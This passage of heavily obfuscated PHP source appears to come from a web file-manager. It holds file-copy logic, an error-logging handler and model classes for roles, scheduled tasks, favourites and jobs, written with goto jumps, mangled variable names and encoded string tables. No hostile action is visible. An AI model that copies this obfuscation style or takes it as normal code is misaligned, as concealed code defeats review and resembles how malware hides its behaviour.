¨©‡[$d†œ“šÚ¢[77]]); if ($e×œ³¨ºœš) { $FòË”À‡‰[$d†œ“šÚ¢[501]][] = $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]]; } continue; } else { if ($a¦„´íÔ == REPEAT_RENAME) { $EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]] = $this->fileNameAutoCache($D®Œ®¸ÃŞ—, $EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]], $a¦„´íÔ, !1); } } } } if (!$EÖ«Õ ¨©‡[$d†œ“šÚ¢[370]] && $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]]) { $FòË”À‡‰[$d†œ“šÚ¢[501]][] = $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]]; } $f¶Şéâçß[] = $this->_makeItemData($EÖ«Õ ¨©‡, $Bº†¾šâÉğ, $EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]]); goto BÉøÉ³¤«; b«ËÁİƒíÏ: $EÖ«Õ ¨©‡[$d†œ“šÚ¢[77]] = _get($EÖ«Õ ¨©‡, $d†œ“šÚ¢[77], 0); $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]] = _get($EÖ«Õ ¨©‡, $d†œ“šÚ¢[419], 0); if (!isset($EÖ«Õ ¨©‡[$d†œ“šÚ¢[541]]) && $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]]) { $FòË”À‡‰[$d†œ“šÚ¢[538]][] = $EÖ«Õ ¨©‡[$d†œ“šÚ¢[419]]; } goto b°ëÒÆêŠ•; F³‹ÅöšÁ: if (isset($a°ˆ¢Ÿ§Â›[$EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]]])) { $EÖ«Õ ¨©‡ = $a°ˆ¢Ÿ§Â›[$EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]]]; } $EÖ«Õ ¨©‡[$d†œ“šÚ¢[370]] = $EÖ«Õ ¨©‡[$d†œ“šÚ¢[29]] == $d†œ“šÚ¢[76]; $EÖ«Õ ¨©‡[$d†œ“šÚ¢[372]] = _get($EÖ«Õ ¨©‡, $d†œ“šÚ¢[160], $d†œ“šÚ¢[33]); goto b«ËÁİƒíÏ; BÉøÉ³¤«: } unset($EÖ«Õ ¨©‡); if (!empty($f¶Şéâçß)) { $this->addAll($f¶Şéâçß); } goto f¢šêÚâÒ; f¢šêÚâÒ: $bÕÉ†®¿–Ş = $this->_childrenList($D®Œ®¸ÃŞ—); $bÕÉ†®¿–Ş = array_to_keyvalue($bÕÉ†®¿–Ş, $d†œ“šÚ¢[28]); foreach ($b’¥ÔáÛ„¸ as $EÖ«Õ ¨©‡) { $BÇÜèó¯½Ç = $bÕÉ†®¿–Ş[$EÖ«Õ ¨©‡[$d†œ“šÚ¢[28]]]; $BåİîŒêê = $BÇÜèó¯½Ç[$d†œ“šÚ¢[369]]; $this->_copyApplyMeta($BÇÜèó¯½Ç, $FòË”À‡‰); if ($EÖ«Õ ¨©‡[$d†œ“šÚ¢[29]] == $d†œ“šÚ¢[76]) { $EÖ«Õ ¨©‡[$d†œ“šÚ¢[75]] = $CĞß‘Ì…¯->getPathInner($EÖ«Õ ¨©‡[$d†œ“šÚ¢[75]]); $this->_copyChildTo($CĞß‘Ì…¯, $EÖ«Õ ¨©‡[$d†œ“šÚ¢[75]], $BåİîŒêê, $a¦„´íÔ, $FòË”À‡‰, $FÀÄ§ğ¶áÁ); } } goto dÖÉŞÊôÅó; EôàÈ¹¢£: $b’¥ÔáÛ„¸ = array_merge($eõİîƒíï£[$d†œ“šÚ¢[73]], $eõİîƒíï£[$d†œ“šÚ¢[74]]); $a°ˆ¢Ÿ§Â› = $this->_addFiles($CĞß‘Ì…¯, $eõİîƒíï£[$d†œ“šÚ¢[73]], $FÀÄ§ğ¶áÁ); $f¶Şéâçß = array(); goto cÑÔŒÃ¶æ; dÖÉŞÊôÅó: } private function _addFiles($D†¡Ä‰…“¡, $a¬©“¥Â‚², $C„±§Ç…Ûõ) { goto b›×ƒòÈˆÑ; eÊ‚Ä…¯çí: foreach ($a¬©“¥Â‚² as &$CÍîé•çù) { goto cŠÄ£Æ‡‚İ; eÛˆÒ‰›Ò: $CÍîé•çù[$e’õö¸«¦[163]] = $B¥ê“ñŠš; Hook::trigger($e’õö¸«¦[543], $CÍîé•çù); $câÌîñ¢Îó[$B¥ê“ñŠš][] =& $CÍîé•çù; goto fì­¬Ğ—‡À; dµÜ‘¶ÏÛÔ: $B¥ê“ñŠš = $D†¡Ä‰…“¡->hashMd5($CÍîé•çù[$e’õö¸«¦[75]]); if (strlen($B¥ê“ñŠš) > 10 && !isset($câÌîñ¢Îó[$B¥ê“ñŠš])) { $câÌîñ¢Îó[$B¥ê“ñŠš] = array(); } $CÍîé•çù[$e’õö¸«¦[164]] = $BÙ†éµªïÍ; goto eÛˆÒ‰›Ò; cŠÄ£Æ‡‚İ: Hook::trigger($e’õö¸«¦[542], $CÍîé•çù); $CÍîé•çù[$e’õö¸«¦[75]] = $D†¡Ä‰…“¡->getPathInner($CÍîé•çù[$e’õö¸«¦[75]]); $BÙ†éµªïÍ = $D†¡Ä‰…“¡->hashSimple($CÍîé•çù[$e’õö¸«¦[75]]); goto dµÜ‘¶ÏÛÔ; fì­¬Ğ—‡À: if (count($câÌîñ¢Îó[$B¥ê“ñŠš]) > 1) { $CÍîé•çù[$e’õö¸«¦[541]] = !0; } goto Bò’Šæà¢–; Bò’Šæà¢–: } $eˆ‚»ùÙ› = array($e’õö¸«¦[163] => array($e’õö¸«¦[7], array_keys($câÌîñ¢Îó))); $BİéÀóãëë = Model($e’õö¸«¦[544]); goto f’Ÿ‚ŸÒ; f’Ÿ‚ŸÒ: $cß—Ø±­ê = $BİéÀóãëë->where($eˆ‚»ùÙ›)->select(); $cß—Ø±­ê = $cß—Ø±­ê ? $cß—Ø±­ê : array(); foreach ($cß—Ø±­ê as $C¢¦‘ßÑÌ) { if (!isset($câÌîñ¢Îó[$C¢¦‘ßÑÌ[$e’õö¸«¦[163]]])) { continue; } $DÏÊšÏÄ™¯ = $câÌîñ¢Îó[$C¢¦‘ßÑÌ[$e’õö¸«¦[163]]]; foreach ($DÏÊšÏÄ™¯ as &$CÍîé•çù) { $CÍîé•çù[$e’õö¸«¦[419]] = $C¢¦‘ßÑÌ[$e’õö¸«¦[419]]; $CÍîé•çù[$e’õö¸«¦[541]] = !0; } unset($CÍîé•çù); } goto e´–Ù©áŞÍ; f·äøÏì¦¨: return $cìÊš«İá; goto b„Ù’ªÚ‘Ø; dç‹£À‘Áã: $eˆ‚»ùÙ› = array($e’õö¸«¦[163] => array($e’õö¸«¦[7], array_keys($câÌîñ¢Îó))); $cß—Ø±­ê = $BİéÀóãëë->where($eˆ‚»ùÙ›)->select(); $cß—Ø±­ê = $cß—Ø±­ê ? $cß—Ø±­ê : array(); goto cñ¦¢„ˆ“Ã; cñ¦¢„ˆ“Ã: foreach ($cß—Ø±­ê as $C¢¦‘ßÑÌ) { if (!isset($câÌîñ¢Îó[$C¢¦‘ßÑÌ[$e’õö¸«¦[163]]])) { continue; } $FšÕÍóÔ›Ñ =& $câÌîñ¢Îó[$C¢¦‘ßÑÌ[$e’õö¸«¦[163]]]; foreach ($FšÕÍóÔ›Ñ as &$CÍîé•çù) { $CÍîé•çù[$e’õö¸«¦[419]] = $C¢¦‘ßÑÌ[$e’õö¸«¦[419]]; } unset($CÍîé•çù); } $cìÊš«İá = array(); foreach ($a¬©“¥Â‚² as $fìÔÜ¤ ™×) { $cìÊš«İá[$fìÔÜ¤ ™×[$e’õö¸«¦[28]]] = $fìÔÜ¤ ™×; } goto f·äøÏì¦¨; e´–Ù©áŞÍ: $eëˆŠ’¿¢” = array(); foreach ($a¬©“¥Â‚² as $fÚï¢‘÷¨¿) { if (isset($fÚï¢‘÷¨¿[$e’õö¸«¦[541]]) && $fÚï¢‘÷¨¿[$e’õö¸«¦[541]]) { continue; } $fÊ‰¶½¸áâ = $D†¡Ä‰…“¡->getPathInner($fÚï¢‘÷¨¿[$e’õö¸«¦[75]]); $dÒÎòŒ½Ä´ = $BİéÀóãëë->addFileMake($fÊ‰¶½¸áâ, $fÚï¢‘÷¨¿[$e’õö¸«¦[77]], $fÚï¢‘÷¨¿[$e’õö¸«¦[164]], $fÚï¢‘÷¨¿[$e’õö¸«¦[163]], $fÚï¢‘÷¨¿[$e’õö¸«¦[28]], $C„±§Ç…Ûõ); $eëˆŠ’¿¢”[] = $dÒÎòŒ½Ä´; } $BİéÀóãëë->addAll($eëˆŠ’¿¢”); goto dç‹£À‘Áã; b›×ƒòÈˆÑ: $e’õö¸«¦ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$a¬©“¥Â‚² || count($a¬©“¥Â‚²) == 0) { return array(); } $câÌîñ¢Îó = array(); goto eÊ‚Ä…¯çí; b„Ù’ªÚ‘Ø: } } define($_SERVER[³‘’¼äÑ™ÔÍ][545], $_SERVER[³‘’¼äÑ™ÔÍ][546]); goto f‚Ê³ÈÔÒ; C§‘ƒØëÍŠ: function beforeShutdownError($eØ“ç‡µË¼ = false, $BçäÂ»·ç = '', $dÍ· ¯¦—† = '', $dµêŒê¹ËÒ = 0) { $bŠŸ÷í‰¢ =& $_SERVER[Êß·®ÍËúû]; switch ($eØ“ç‡µË¼) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $fåÓ¤’„™¹ = $bŠŸ÷í‰¢[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $fåÓ¤’„™¹ = $bŠŸ÷í‰¢[40]; break; case E_STRICT: $fåÓ¤’„™¹ = $bŠŸ÷í‰¢[41]; break; case E_NOTICE: case E_USER_NOTICE: $fåÓ¤’„™¹ = $bŠŸ÷í‰¢[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $fåÓ¤’„™¹ = $bŠŸ÷í‰¢[43]; break; default: break; } if (!$fåÓ¤’„™¹ || $fåÓ¤’„™¹ == $bŠŸ÷í‰¢[42] || $fåÓ¤’„™¹ == $bŠŸ÷í‰¢[43]) { return; } $dÍ· ¯¦—† = $bŠŸ÷í‰¢[4] . str_replace($_SERVER[$bŠŸ÷í‰¢[37]], $bŠŸ÷í‰¢[20], $dÍ· ¯¦—†); $FŸİÈâÈŒÍ = $fåÓ¤’„™¹ . $bŠŸ÷í‰¢[44] . $BçäÂ»·ç . $bŠŸ÷í‰¢[44] . $dÍ· ¯¦—† . $bŠŸ÷í‰¢[44] . $dµêŒê¹ËÒ; write_log($FŸİÈâÈŒÍ . $bŠŸ÷í‰¢[18] . get_caller_msg(1), $bŠŸ÷í‰¢[19]); } $_SERVER[$_SERVER[Êß·®ÍËúû][45]] = $_SERVER[$_SERVER[Êß·®ÍËúû][37]] . $_SERVER[Êß·®ÍËúû][46]; $d¯óö¸İÎ¬ = strrev(base64_decode($_SERVER[Êß·®ÍËúû][47])); goto DîğæØ²¸Ë; cØ¤Ñ‹òË: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\x72\x6f\154\145\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\150", "\x6c\141\x62\x65\154", "\144\x69\163\x70\154\x61\171", "\163\171\163\x74\145\x6d", "\144\145\x73\x63", "\x69\x67\x6e\x6f\x72\x65\105\170\x74", "\151\x67\x6e\x6f\x72\x65\106\x69\154\x65\x53\x69\x7a\145", "\x61\144\155\x69\156\151\x73\164\162\x61\164\x6f\x72", "\163\157\162\164"); public function listData($cËğ·ïÆŸ = false, $E™»È¼‰‚™ = "\163\x6f\x72\x74", $B—›Ô­ØÑ… = false) { $A´‡“ƒ§Ãò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a²óĞ™óÅ = parent::listData($cËğ·ïÆŸ, $E™»È¼‰‚™, $B—›Ô­ØÑ…); if (!$cËğ·ïÆŸ) { $Dğ‡Éá‹Ë´ = $A´‡“ƒ§Ãò[2492]; foreach ($a²óĞ™óÅ as $bÇÆ½•ä©­ => $eê­÷ïÎ³) { if ($eê­÷ïÎ³[$A´‡“ƒ§Ãò[2493]] == 1) { $a²óĞ™óÅ[$bÇÆ½•ä©­][$A´‡“ƒ§Ãò[405]] = $Dğ‡Éá‹Ë´; } } } return $a²óĞ™óÅ; } public function update($d—áçƒ‹òæ, $F½õğ·´¿ä) { goto B³İ½³’´§; B³İ½³’´§: $e‘´´ˆ¯  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E”‡¡¦•áÆ = parent::listData($d—áçƒ‹òæ); $b¸ öğç = $this->findByName($F½õğ·´¿ä[$e‘´´ˆ¯ [28]]); goto BŸºëóø; D„¨¥µ¡æ²: return parent::update($d—áçƒ‹òæ, $F½õğ·´¿ä); goto E×ˆ« ‡÷á; BŸºëóø: if (!$E”‡¡¦•áÆ || $b¸ öğç && $b¸ öğç[$e‘´´ˆ¯ [367]] != $E”‡¡¦•áÆ[$e‘´´ˆ¯ [367]]) { return !1; } if ($b¸ öğç[$e‘´´ˆ¯ [2493]] == 1) { $F½õğ·´¿ä = array($e‘´´ˆ¯ [28] => $F½õğ·´¿ä[$e‘´´ˆ¯ [28]], $e‘´´ˆ¯ [2131] => $F½õğ·´¿ä[$e‘´´ˆ¯ [2131]]); } $this->filterAuth($F½õğ·´¿ä[$e‘´´ˆ¯ [376]]); goto D„¨¥µ¡æ²; E×ˆ« ‡÷á: } public function remove($cËëõ°ÌÑÁ) { $aåœˆˆœ¤« = parent::listData($cËëõ°ÌÑÁ); if (!$aåœˆˆœ¤« || $aåœˆˆœ¤«[$_SERVER[³‘’¼äÑ™ÔÍ][1084]]) { return !1; } return parent::remove($cËëõ°ÌÑÁ); } public function add($D¯ÛÅ©°…ù) { goto aãÕÆË¡¬æ; EÀŠíÇøÄ¶: $b¾Ññ¤ò‘ø = array($b—¢¾ôî¦[386] => $dÂ½ˆôš¹‹, $b—¢¾ôî¦[2119] => $b—¢¾ôî¦[33], $b—¢¾ôî¦[2115] => $b—¢¾ôî¦[2132], $b—¢¾ôî¦[2494] => 1, $b—¢¾ôî¦[2118] => 0, $b—¢¾ôî¦[2495] => 0, $b—¢¾ôî¦[2117] => $this->getSort()); $D¯ÛÅ©°…ù = array_merge($b¾Ññ¤ò‘ø, $D¯ÛÅ©°…ù); $this->filterAuth($D¯ÛÅ©°…ù[$b—¢¾ôî¦[376]]); goto D™—§ÇÚêƒ; D™—§ÇÚêƒ: return parent::insert($D¯ÛÅ©°…ù); goto DÀåÆø‹½‹; aãÕÆË¡¬æ: $b—¢¾ôî¦ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÂ½ˆôš¹‹ = $D¯ÛÅ©°…ù[$b—¢¾ôî¦[28]]; if ($this->findByName($dÂ½ˆôš¹‹)) { return !1; } goto EÀŠíÇøÄ¶; DÀåÆø‹½‹: } private function getSort() { $AŒÃí…Ò‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AŸš‹óÎ­ = parent::listData(); $fçõĞ»¹™† = array_to_keyvalue($AŸš‹óÎ­, $AŒÃí…Ò‚[33], $AŒÃí…Ò‚[2134]); return empty($fçõĞ»¹™†) ? 0 : max($fçõĞ»¹™†) + 1; } private function filterAuth(&$E‰Ÿ£ˆ¸Î›) { $AÚ‚‘‰ÂÇ® =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bó•¾Ï¨– = array(); $b´Î’ºŒ‹¿ = array_filter(explode($AÚ‚‘‰ÂÇ®[47], $E‰Ÿ£ˆ¸Î›)); foreach ($b´Î’ºŒ‹¿ as $E‰Ÿ£ˆ¸Î›) { $fã¼·ÀØ  = explode($AÚ‚‘‰ÂÇ®[91], $E‰Ÿ£ˆ¸Î›); if ($fã¼·ÀØ [0] == $AÚ‚‘‰ÂÇ®[1792] && $fã¼·ÀØ [1] != $AÚ‚‘‰ÂÇ®[1040]) { $Fè½ÎêÔÇ¸ = $fã¼·ÀØ [0] . $AÚ‚‘‰ÂÇ®[91] . $fã¼·ÀØ [1] . $AÚ‚‘‰ÂÇ®[2496]; if (!in_array($Fè½ÎêÔÇ¸, $b´Î’ºŒ‹¿)) { $bó•¾Ï¨–[] = $Fè½ÎêÔÇ¸; } } $bó•¾Ï¨–[] = $E‰Ÿ£ˆ¸Î›; } $E‰Ÿ£ˆ¸Î› = implode($AÚ‚‘‰ÂÇ®[47], $bó•¾Ï¨–); } public function sort($CÚ¾İ™¶„³, $dÅ¯ó¤°ÅŠ) { return parent::update($CÚ¾İ™¶„³, $dÅ¯ó¤°ÅŠ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\164\x61\x73\x6b\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\145", "\145\x76\x65\156\164", "\164\151\155\145", "\144\145\x73\x63", "\163\171\163\x74\x65\155", "\145\x6e\141\142\154\x65", "\154\141\163\x74\122\x75\156", "\x73\x6f\162\x74"); public function listData($bë¦ç£ÌÎ = false, $EÂÍÏòÌ¢î = "\x73\157\162\x74", $fŒïù‡¦ùñ = false) { return parent::listData($bë¦ç£ÌÎ, $EÂÍÏòÌ¢î, $fŒïù‡¦ùñ); } public function add($CÔƒĞ™ˆã‹) { $c¥Ë‹Ìô  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c§ÃšÁš½ = $this->findByName($CÔƒĞ™ˆã‹[$c¥Ë‹Ìô [28]]); if ($c§ÃšÁš½) { return !1; } $CÔƒĞ™ˆã‹[$c¥Ë‹Ìô [1410]] = 0; $CÔƒĞ™ˆã‹[$c¥Ë‹Ìô [2134]] = $this->getSort(); return parent::insert($CÔƒĞ™ˆã‹); } private function getSort() { $Dµèíß˜Üé =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c£ê±÷ß¨ê = parent::listData(); $eç±”ÜŠ®¤ = array_to_keyvalue($c£ê±÷ß¨ê, $Dµèíß˜Üé[33], $Dµèíß˜Üé[2134]); return empty($eç±”ÜŠ®¤) ? 0 : max($eç±”ÜŠ®¤) + 1; } public function update($FÛïˆ–ƒÎ, $EŸÑ‚¯‰ù„) { $FŠê¬Ù´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÚî˜ºÖŠœ = $this->listData($FÛïˆ–ƒÎ); $cœÙõ–Ä°‘ = $this->findByName($EŸÑ‚¯‰ù„[$FŠê¬Ù´[28]]); if (!$fÚî˜ºÖŠœ || $cœÙõ–Ä°‘ && $cœÙõ–Ä°‘[$FŠê¬Ù´[367]] != $fÚî˜ºÖŠœ[$FŠê¬Ù´[367]]) { return !1; } return parent::update($FÛïˆ–ƒÎ, $EŸÑ‚¯‰ù„); } public function remove($fÕ×¥èÓğÊ, $f àùÏº¦ã = false) { $dÃ†Ú¦î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aĞ¢ğ•Ş¾Æ = $this->listData($fÕ×¥èÓğÊ); if (!$aĞ¢ğ•Ş¾Æ) { return; } if (!$f àùÏº¦ã && $aĞ¢ğ•Ş¾Æ[$dÃ†Ú¦î[1084]] == $dÃ†Ú¦î[83]) { return !1; } return parent::remove($fÕ×¥èÓğÊ); } public function enable($eîÁ‹é³¾„, $Eƒç±Ä‘) { return $this->update($eîÁ‹é³¾„, array($_SERVER[³‘’¼äÑ™ÔÍ][2486] => $Eƒç±Ä‘)); } public function run($Fæ¶Æ¨æÃí) { return $this->update($Fæ¶Æ¨æÃí, array($_SERVER[³‘’¼äÑ™ÔÍ][2497] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\141\x76"; protected function cacheFunctionAlias($CµˆË ¬±) { $a©¢‹÷Ûñ· =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($a©¢‹÷Ûñ·[2498] => array(USER_ID, $a©¢‹÷Ûñ·[2499])); } protected function listData() { $Då„Ú„ºöù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DŠç¦ºŒ = array($Då„Ú„ºöù[1436] => USER_ID, $Då„Ú„ºöù[436] => 0); $d§¯Ø…š• = $Då„Ú„ºöù[2500]; $Aíğá’¼õ  = $this->field($d§¯Ø…š•)->where($DŠç¦ºŒ)->order($Då„Ú„ºöù[2501])->select(); return $Aíğá’¼õ  ? $Aíğá’¼õ  : array(); } protected function resetCache() { } protected function listView() { goto E‘¨¯ˆŒºš; E‘¨¯ˆŒºš: $cÍ´ƒ¹¯ê– =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bŠÇ°æ„ôÌ = $this->listData(); $D¨ˆøõ…†ø = array_filter_by_field($bŠÇ°æ„ôÌ, $cÍ´ƒ¹¯ê–[29], $cÍ´ƒ¹¯ê–[382]); goto f—È…„è¼; bÛ×¢ÑìÌŸ: $DÃİ…¯Àîê = array_to_keyvalue($DÃİ…¯Àîê, $cÍ´ƒ¹¯ê–[369]); foreach ($bŠÇ°æ„ôÌ as $Cæåêá®• => $DÑ¬”›Ç–¦) { $B‘º´ÇŸÏ’ = $DÃİ…¯Àîê[$DÑ¬”›Ç–¦[$cÍ´ƒ¹¯ê–[75]]]; $B‘º´ÇŸÏ’ = $B‘º´ÇŸÏ’ ? $B‘º´ÇŸÏ’ : array(); $bŠÇ°æ„ôÌ[$Cæåêá®•] = array_merge($B‘º´ÇŸÏ’, $DÑ¬”›Ç–¦); } return $bŠÇ°æ„ôÌ; goto E‹‘éè; f—È…„è¼: $aê¤½ÜŸ”Ğ = array_to_keyvalue($D¨ˆøõ…†ø, $cÍ´ƒ¹¯ê–[33], $cÍ´ƒ¹¯ê–[75]); if (!$aê¤½ÜŸ”Ğ) { return $bŠÇ°æ„ôÌ; } $aàÑ‚å”«ô = 2000; goto AÂååŞì™; AÂååŞì™: $AÈÖ—íù¡Ï = array($cÍ´ƒ¹¯ê–[383] => array($cÍ´ƒ¹¯ê–[384], $aê¤½ÜŸ”Ğ)); $DÃİ…¯Àîê = Model($cÍ´ƒ¹¯ê–[756])->listSource($AÈÖ—íù¡Ï, $aàÑ‚å”«ô); $DÃİ…¯Àîê = array_merge($DÃİ…¯Àîê[$cÍ´ƒ¹¯ê–[73]], $DÃİ…¯Àîê[$cÍ´ƒ¹¯ê–[74]]); goto bÛ×¢ÑìÌŸ; E‹‘éè: } protected function addFav($B—¼Ğª¬“ƒ, $AÚ®Î¬á·¡ = '', $c”Õí·ä‚ = "\x73\157\165\x72\x63\x65") { goto Eññë†—Ñ; CÜÎ™Âš’ñ: return $this->add($D‰ªÖøÕÃ); goto bæâÂÃÇÇê; E—â»ÈÅ: $C…Ì¸õŠ° = array($BÒİİê¦ [1436] => USER_ID, $BÒİİê¦ [436] => 0); $F¼ä•ÈÅ¿‚ = $this->where($C…Ì¸õŠ°)->max($BÒİİê¦ [2134]); if (!$F¼ä•ÈÅ¿‚) { $F¼ä•ÈÅ¿‚ = 0; } goto E‹˜¢Æ‡à; Eññë†—Ñ: $BÒİİê¦  =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C…Ì¸õŠ° = array($BÒİİê¦ [1436] => USER_ID, $BÒİİê¦ [436] => 0, $BÒİİê¦ [388] => $c”Õí·ä‚, $BÒİİê¦ [387] => $B—¼Ğª¬“ƒ); if ($this->where($C…Ì¸õŠ°)->find()) { return !1; } goto E—â»ÈÅ; E‹˜¢Æ‡à: if (!$AÚ®Î¬á·¡ && $c”Õí·ä‚ == $BÒİİê¦ [382]) { $d‘•éÃèŞ = Model($BÒİİê¦ [1121])->where(array($BÒİİê¦ [383] => $B—¼Ğª¬“ƒ))->find(); if (!$d‘•éÃèŞ) { return !1; } $AÚ®Î¬á·¡ = $d‘•éÃèŞ[$BÒİİê¦ [28]]; } $AÚ®Î¬á·¡ = $this->getAutoName($AÚ®Î¬á·¡); $D‰ªÖøÕÃ = array($BÒİİê¦ [1436] => USER_ID, $BÒİİê¦ [436] => 0, $BÒİİê¦ [386] => $AÚ®Î¬á·¡, $BÒİİê¦ [387] => $B—¼Ğª¬“ƒ, $BÒİİê¦ [388] => $c”Õí·ä‚, $BÒİİê¦ [2117] => $F¼ä•ÈÅ¿‚ + 1); goto CÜÎ™Âš’ñ; bæâÂÃÇÇê: } protected function remove($cÔÂ”¯°) { $DÆ…å‚ö› =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÈÍÑöÄ½– = array($DÆ…å‚ö›[1436] => USER_ID, $DÆ…å‚ö›[385] => $cÔÂ”¯°); return $this->where($FÈÍÑöÄ½–)->delete(); } protected function removeByName($F³×—“²¼) { $däá‘†Ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B ´ÈÆ·³ö = array($däá‘†Ò[1436] => USER_ID, $däá‘†Ò[386] => $F³×—“²¼, $däá‘†Ò[436] => 0); return $this->where($B ´ÈÆ·³ö)->delete(); } protected function rename($D—ƒ¦Ğ±Ë, $b‰‘í®¸) { $aİÖÒ¸—Ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($D—ƒ¦Ğ±Ë == $b‰‘í®¸) { return !1; } $fÙ¤ùŠİæ = $this->getAutoName($b‰‘í®¸); if ($b‰‘í®¸ != $fÙ¤ùŠİæ) { return !1; } $c‹Äµ¹’–Ê = array($aİÖÒ¸—Ğ[1436] => USER_ID, $aİÖÒ¸—Ğ[436] => 0, $aİÖÒ¸—Ğ[28] => $D—ƒ¦Ğ±Ë); return $this->where($c‹Äµ¹’–Ê)->save(array($aİÖÒ¸—Ğ[28] => $b‰‘í®¸)); } protected function resetSort($dˆæ¥Ÿ) { $cˆ¢•êÏ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dˆæ¥Ÿ = is_array($dˆæ¥Ÿ) ? $dˆæ¥Ÿ : array(); $b¤¡Òæ£¸ƒ = array($cˆ¢•êÏ[1436] => USER_ID); for ($fâÔ¨ØÔ§á = 0; $fâÔ¨ØÔ§á < count($dˆæ¥Ÿ); $fâÔ¨ØÔ§á++) { $b¤¡Òæ£¸ƒ[$cˆ¢•êÏ[385]] = $dˆæ¥Ÿ[$fâÔ¨ØÔ§á]; $this->where($b¤¡Òæ£¸ƒ)->save(array($cˆ¢•êÏ[2117] => $fâÔ¨ØÔ§á + 1)); } return !0; } protected function moveTop($cåÂ‹éĞ£½) { goto dÇù ¡ªø; FÖ‹ğ¡èë•: return $this->resetSort($bÉ½™Òİ‘Š); goto BÏìÅ°©åÆ; Cæ‹…À¥Ö: if (!$cª¥–˜˜ùí) { return; } $bÉ½™Òİ‘Š = $this->field($a¤ÁÅ¶Éñî[367])->where($bóò¡ËÍÚÓ)->order($a¤ÁÅ¶Éñî[2501])->select(); $bÉ½™Òİ‘Š = array_to_keyvalue($bÉ½™Òİ‘Š, $a¤ÁÅ¶Éñî[33], $a¤ÁÅ¶Éñî[367]); goto D¹Ôğå‰÷; D¹Ôğå‰÷: $BªÕÁ–Ãöó = $bÉ½™Òİ‘Š; $bÉ½™Òİ‘Š = array_remove_value($bÉ½™Òİ‘Š, $cª¥–˜˜ùí[$a¤ÁÅ¶Éñî[367]]); array_unshift($bÉ½™Òİ‘Š, $cª¥–˜˜ùí[$a¤ÁÅ¶Éñî[367]]); goto FÖ‹ğ¡èë•; dÇù ¡ªø: $a¤ÁÅ¶Éñî =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bóò¡ËÍÚÓ = array($a¤ÁÅ¶Éñî[1436] => USER_ID, $a¤ÁÅ¶Éñî[436] => 0); $cª¥–˜˜ùí = $this->where($bóò¡ËÍÚÓ)->where(array($a¤ÁÅ¶Éñî[28] => $cåÂ‹éĞ£½))->find(); goto Cæ‹…À¥Ö; BÏìÅ°©åÆ: } protected function moveBottom($b§„†¦¸„¬) { $féøÃÔ¥áĞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÚâåª¿ÖÙ = array($féøÃÔ¥áĞ[1436] => USER_ID, $féøÃÔ¥áĞ[436] => 0); $cø–§¹”Á» = $this->where($fÚâåª¿ÖÙ)->max($féøÃÔ¥áĞ[2134]); $BĞ™Ü›á¸Œ = array($féøÃÔ¥áĞ[2134] => $cø–§¹”Á» + 1); return $this->where($fÚâåª¿ÖÙ)->where(array($féøÃÔ¥áĞ[28] => $b§„†¦¸„¬))->save($BĞ™Ü›á¸Œ); } private function getAutoName($dÚ¦„âŸÄ›) { goto A²èÖ­ñ¯–; A²èÖ­ñ¯–: $f§ñë²ÔÑ• =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cè®¯‘æ¹È = array($f§ñë²ÔÑ•[1436] => USER_ID, $f§ñë²ÔÑ•[436] => 0); $cİô—©Ñ = $this->field($f§ñë²ÔÑ•[28])->where($Cè®¯‘æ¹È)->select(); goto CŸ´ùºÁÊå; CŸ´ùºÁÊå: $cİô—©Ñ = array_to_keyvalue($cİô—©Ñ, $f§ñë²ÔÑ•[33], $f§ñë²ÔÑ•[28]); if (!$cİô—©Ñ || !in_array($dÚ¦„âŸÄ›, $cİô—©Ñ)) { return $dÚ¦„âŸÄ›; } for ($a÷¡óëä¾ = 0; $a÷¡óëä¾ < count($cİô—©Ñ); $a÷¡óëä¾++) { if (!in_array($dÚ¦„âŸÄ› . "\50{$a÷¡óëä¾}\x29", $cİô—©Ñ)) { return $dÚ¦„âŸÄ› . "\x28{$a÷¡óëä¾}\51"; } } goto EÑòÆò¸È®; EÑòÆò¸È®: return $dÚ¦„âŸÄ› . "\50{$a÷¡óëä¾}\51"; goto E ¯ŠÎˆ¼¶; E ¯ŠÎˆ¼¶: } } goto c˜ø«ƒ‘œÖ; c˜ø«ƒ‘œÖ: class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\155\56\x6a\157\x62\114\151\x73\164"; public $field = array("\156\x61\155\145", "\x64\145\163\143", 